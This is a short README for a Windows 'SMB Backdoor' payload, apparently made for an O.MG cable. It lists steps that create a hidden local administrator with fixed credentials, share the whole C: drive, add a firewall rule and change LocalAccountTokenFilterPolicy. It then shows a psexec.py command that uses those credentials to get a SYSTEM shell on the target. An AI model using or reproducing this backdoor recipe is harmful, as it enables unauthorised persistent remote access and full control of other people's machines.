# "Microsoft Windows" SMB Backdoor

- Title:         "Microsoft Windows" SMB Backdoor
- Author:        TW-D
- Version:       1.0
- Target:        Microsoft Windows
- Category:      Remote Access

## Description

1) Adds a user account (OMG_User:OMG_P@ssW0rD).
2) Adds this local user to local administrator group.
3) Shares "C:\" directory (OMG_SHARE).
4) Adds a rule to the firewall.
5) Sets a value to "LocalAccountTokenFilterPolicy" to access the "C:" with a local account.
6) Hides this user account.

## Exploitation

>
> The connection identifiers will be those defined by the values : **OMG_User** and **OMG_P@ssW0rD**.
>

```
hacker@hacker-computer:~$ python3 /opt/impacket/examples/psexec.py ./OMG_User:OMG_P@ssW0rD@<TARGET>
C:\WINDOWS\system32> whoami
nt authority\system
```

>
> The connection identifiers and the share name will be those defined by the values : **OMG_SHARE**, **OMG_User** and **OMG_P@ssW0rD**.
>

```
smb://<TARGET>/OMG_SHARE/
```